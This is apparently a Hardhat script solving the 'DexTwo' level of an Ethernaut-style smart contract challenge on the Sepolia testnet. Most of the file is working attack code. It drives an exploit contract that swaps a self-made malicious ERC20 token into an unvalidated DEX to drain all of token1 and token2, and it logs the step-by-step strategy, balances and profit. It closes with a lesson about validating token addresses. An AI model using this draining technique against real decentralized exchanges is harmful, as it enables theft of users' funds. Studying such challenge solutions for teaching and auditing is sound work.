import { ethers } from "hardhat";

/**
 * Execute the DexTwo exploit to drain both tokens using a malicious token
 * 
 * Usage:
 * DEX_TWO_EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xYourDexTwoAddress npx hardhat run scripts/level-23-dex2/execute-dex-two-exploit.ts --network sepolia
 */
async function main() {
  console.log("Executing DexTwo exploit...");
  
  // Get the addresses from environment
  const exploitAddress = process.env.DEX_TWO_EXPLOIT_ADDRESS;
  const targetAddress = process.env.TARGET_ADDRESS;
  
  if (!exploitAddress) {
    throw new Error("Environment variable DEX_TWO_EXPLOIT_ADDRESS must be set");
  }
  
  if (!targetAddress) {
    throw new Error("Environment variable TARGET_ADDRESS must be set");
  }
  
  // Get the signer account
  const [signer] = await ethers.getSigners();
  console.log(`Using signer account: ${signer.address}`);
  
  try {
    // Connect to the contracts
    const dexTwoExploit = await ethers.getContractAt("DexTwoExploit", exploitAddress);
    const dexTwo = await ethers.getContractAt("DexTwo", targetAddress);
    
    // Get token addresses
    const token1Address = await dexTwo.token1();
    const token2Address = await dexTwo.token2();
    const maliciousTokenAddress = await dexTwoExploit.getMaliciousToken();
    
    console.log(`Token1: ${token1Address}`);
    console.log(`Token2: ${token2Address}`);
    console.log(`Malicious Token: ${maliciousTokenAddress}`);
    
    const token1 = await ethers.getContractAt("SwappableTokenTwo", token1Address);
    const token2 = await ethers.getContractAt("SwappableTokenTwo", token2Address);
    const maliciousToken = await ethers.getContractAt("MaliciousToken", maliciousTokenAddress);
    
    // Check initial state
    console.log("\n=== Initial State ===");
    const initialExploitToken1 = await token1.balanceOf(exploitAddress);
    const initialExploitToken2 = await token2.balanceOf(exploitAddress);
    const initialExploitMalicious = await maliciousToken.balanceOf(exploitAddress);
    const initialDexToken1 = await token1.balanceOf(targetAddress);
    const initialDexToken2 = await token2.balanceOf(targetAddress);
    const initialDexMalicious = await maliciousToken.balanceOf(targetAddress);
    
    console.log(`DexTwoExploit balances:`);
    console.log(`  Token1: ${ethers.formatEther(initialExploitToken1)}`);
    console.log(`  Token2: ${ethers.formatEther(initialExploitToken2)}`);
    console.log(`  Malicious: ${ethers.formatEther(initialExploitMalicious)}`);
    console.log(`DexTwo balances:`);
    console.log(`  Token1: ${ethers.formatEther(initialDexToken1)}`);
    console.log(`  Token2: ${ethers.formatEther(initialDexToken2)}`);
    console.log(`  Malicious: ${ethers.formatEther(initialDexMalicious)}`);
    
    if (initialDexToken1 == 0n && initialDexToken2 == 0n) {
      console.log("\n‚ö†Ô∏è  Warning: Both tokens are already drained. The exploit has already been executed.");
      return;
    }
    
    if (initialExploitToken1 < 10 || initialExploitToken2 < 10) {
      console.log("\n‚ö†Ô∏è  Warning: DexTwoExploit doesn't have the initial 10 tokens of each type.");
      console.log("Make sure to transfer 10 of each token to the exploit contract first.");

      if(initialExploitToken1 < 10) {
        console.log("Transferring 10 token1 to DexTwoExploit...");
        const transfer1Tx = await token1.transfer(exploitAddress, 10);
        await transfer1Tx.wait();
        console.log("Transferred 10 token1 to DexTwoExploit");
      }

      if(initialExploitToken2 < 10) {
        console.log("Transferring 10 token2 to DexTwoExploit...");
        const transfer2Tx = await token2.transfer(exploitAddress, 10);
        await transfer2Tx.wait();
        console.log("Transferred 10 token2 to DexTwoExploit");
      }
    }

    // Execute the exploit
    console.log("\n=== Executing Exploit ===");
    console.log("This will use a malicious token to drain both token1 and token2...");
    console.log("\nStrategy:");
    console.log("  1. Transfer 1 malicious token to DexTwo");
    console.log("  2. Swap 1 malicious token for ALL 100 token1");
    console.log("     Price: (1 * 100) / 1 = 100 token1");
    console.log("  3. Swap 2 malicious tokens for ALL 100 token2");
    console.log("     Price: (2 * 100) / 2 = 100 token2");
    console.log("  4. Both tokens drained!\n");
    
    const tx = await dexTwoExploit.exploit();
    console.log("Transaction hash:", tx.hash);
    console.log("Waiting for confirmation...");
    
    const receipt = await tx.wait();
    console.log("Transaction confirmed in block:", receipt?.blockNumber || 'unknown');
    
    // Parse events to show the exploit sequence
    if (receipt?.logs) {
      console.log("\n=== Exploit Sequence ===");
      for (const log of receipt.logs) {
        try {
          const parsedLog = dexTwoExploit.interface.parseLog(log);
          if (parsedLog && parsedLog.name === "ExploitStep") {
            const { description, maliciousBalance, token1Balance, token2Balance } = parsedLog.args;
            console.log(`\n${description}`);
            console.log(`  DexTwo balances:`);
            console.log(`    Malicious: ${ethers.formatEther(maliciousBalance)}`);
            console.log(`    Token1: ${ethers.formatEther(token1Balance)}`);
            console.log(`    Token2: ${ethers.formatEther(token2Balance)}`);
          }
        } catch (e) {
          // Not an event from our contract, skip it
        }
      }
    }
    
    // Check the final state
    console.log("\n=== Final State ===");
    const finalExploitToken1 = await token1.balanceOf(exploitAddress);
    const finalExploitToken2 = await token2.balanceOf(exploitAddress);
    const finalExploitMalicious = await maliciousToken.balanceOf(exploitAddress);
    const finalDexToken1 = await token1.balanceOf(targetAddress);
    const finalDexToken2 = await token2.balanceOf(targetAddress);
    const finalDexMalicious = await maliciousToken.balanceOf(targetAddress);
    
    console.log(`DexTwoExploit balances:`);
    console.log(`  Token1: ${ethers.formatEther(finalExploitToken1)}`);
    console.log(`  Token2: ${ethers.formatEther(finalExploitToken2)}`);
    console.log(`  Malicious: ${ethers.formatEther(finalExploitMalicious)}`);
    console.log(`DexTwo balances:`);
    console.log(`  Token1: ${ethers.formatEther(finalDexToken1)}`);
    console.log(`  Token2: ${ethers.formatEther(finalDexToken2)}`);
    console.log(`  Malicious: ${ethers.formatEther(finalDexMalicious)}`);
    
    // Calculate gains
    const token1Gain = finalExploitToken1 - initialExploitToken1;
    const token2Gain = finalExploitToken2 - initialExploitToken2;
    
    console.log(`\nNet gains:`);
    console.log(`  Token1: ${ethers.formatEther(token1Gain)}`);
    console.log(`  Token2: ${ethers.formatEther(token2Gain)}`);
    
    // Verify the exploit was successful
    if (finalDexToken1 == 0n && finalDexToken2 == 0n) {
      console.log("\n‚úÖ Success! You have drained BOTH tokens from DexTwo!");
      console.log(`   Token1: Started with ${ethers.formatEther(initialExploitToken1)}, ended with ${ethers.formatEther(finalExploitToken1)}`);
      console.log(`   Token2: Started with ${ethers.formatEther(initialExploitToken2)}, ended with ${ethers.formatEther(finalExploitToken2)}`);
      console.log(`   Total profit: ${ethers.formatEther(token1Gain)} token1 + ${ethers.formatEther(token2Gain)} token2`);
      
      console.log("\nüìã How the exploit worked:");
      console.log("   1. DexTwo removed the token validation check from the swap function");
      console.log("   2. This allows swapping ANY ERC20 token, not just token1 and token2");
      console.log("   3. We deployed a malicious token that we fully control");
      console.log("   4. We gave DexTwo 1 malicious token to set up a 1:1 ratio");
      console.log("   5. First swap: 1 malicious ‚Üí 100 token1 (drained all token1!)");
      console.log("   6. After swap, DexTwo has 2 malicious tokens");
      console.log("   7. Second swap: 2 malicious ‚Üí 100 token2 (drained all token2!)");
      console.log("   8. Result: Both legitimate tokens completely drained!");
      
      console.log("\n‚ö†Ô∏è  Lesson: Always validate input parameters, especially token addresses!");
      console.log("    The removed validation check was the critical security vulnerability.");
    } else if (finalDexToken1 == 0n || finalDexToken2 == 0n) {
      console.log("\n‚ö†Ô∏è  Partial success: One token was drained but not both.");
      console.log("   This challenge requires draining BOTH token1 and token2.");
    } else {
      console.log("\n‚ùå Failed! DexTwo still has tokens. The exploit didn't work as expected.");
      console.log("   This could be due to:");
      console.log("   - Modified DexTwo contract");
      console.log("   - Incorrect exploit sequence");
      console.log("   - Malicious token not properly configured");
    }
    
  } catch (error) {
    console.error("Error executing DexTwo exploit:", error);
    throw error;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
